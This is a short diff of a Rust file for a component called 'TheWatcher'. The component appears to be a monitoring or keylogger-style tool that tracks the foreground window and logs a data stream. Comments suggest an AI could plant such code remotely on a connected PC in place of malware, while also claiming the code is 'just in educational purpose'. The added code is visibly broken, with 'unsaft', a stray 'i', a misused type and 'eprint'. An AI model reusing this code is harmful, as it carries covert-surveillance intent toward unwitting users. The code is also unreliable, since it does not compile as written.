@@ -76,7 +76,6 @@ impl TheWatcher {
                 // If AI can drop some codes like this logic,
                 //  malware do not need anymore :)
                 //  just conect PC, and then drop that code remotely.
-
             },
             _ => {
                 // @TODO hook a daemon
@@ -133,6 +132,16 @@ impl TheWatcher {
         // i can write my code more consistently(buffer clean, and then keep watching again).
         // But its not a malware. Just in educational purpose.
 
+        unsaft{
+            let mut hwnd: windows::Win32::Foundation;
+            let get_hwnd= GetForegroundWindow();
+            if get_hwnd.is_invalid(){
+                eprint("can't get hwnd");
+        i   }else{
+                hwnd= get_hwnd.clone();
+            }
+        };
+        
         // logging
         let stream_data = read_data_stream(self.data_bus_stream);
         // @TODO unwrap data
